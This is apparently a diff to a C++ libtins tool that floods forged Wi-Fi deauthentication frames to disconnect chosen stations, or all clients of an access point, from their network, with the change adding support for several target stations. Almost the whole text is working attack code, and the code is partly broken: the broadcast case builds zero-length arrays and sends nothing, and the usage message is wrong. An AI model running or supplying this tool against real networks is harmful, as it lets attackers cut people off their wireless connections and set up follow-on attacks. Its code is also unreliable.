@@ -6,38 +6,44 @@
 using namespace Tins;
 using namespace std;
 
-// diconnect all station is unicast
 
+// first : interface / second : AP / Third~ station
 int main(int argc, char * argv[])
 {
-    RadioTap radio;
-    PacketSender sender;
-    char station[18];
-    char ap[18];
+    vector<string> station;
+    vector<string> ap;
     if(argc>=4)     // diconnect specific station in ap
     {
-        strcpy(ap,argv[2]);
-        strcpy(station,argv[3]);
+        ap.push_back(argv[2]);
+        for(int i=3;i<argc;i++)
+            station.push_back(argv[i]);
     }
     else if(argc==3)    // diconnect all station in ap
     {
-        strcpy(ap,argv[2]);
-        strcpy(station,"FF:FF:FF:FF:FF:FF");
+        ap.push_back(argv[2]);
+        station.push_back("FF:FF:FF:FF:FF:FF");
     }
     else
     {
         printf("usage <interface> <bssid> <ap> \n <interface> <bssid> <ap> <station>\n");
         exit(0);
     }
-    Dot11Deauthentication Deauth(station, ap); // client, AP
-    Deauth.addr3(ap);   // BSSID;
-    //Dot11Deauthentication Deauth("FF:FF:FF:FF:FF:FF","C4:88:E5:0B:16:E4"); // disconnect all ap
+    RadioTap radio[argc-3];
+    Dot11Deauthentication Deauth[argc-3];
+    PacketSender sender;
+    for(int i=0;i<argc-3;i++)
+    {
+        Deauth[i].addr1(station[i]); // Station
+        Deauth[i].addr2(ap[0]);      // Ap
+        Deauth[i].addr3(ap[0]);   // BSSID;
+        radio[i].inner_pdu(Deauth[i]);
+    }
 
-    radio.inner_pdu(Deauth);
     while(1)
     {
-        sender.send(radio,argv[1]);
-        sleep(1);
+        for(int i=0;i<argc-3;i++)
+         sender.send(radio[i],argv[1]);
+        sleep(3);
     }
 
     // "00:24:a5:ea:c4:fa" my test ap
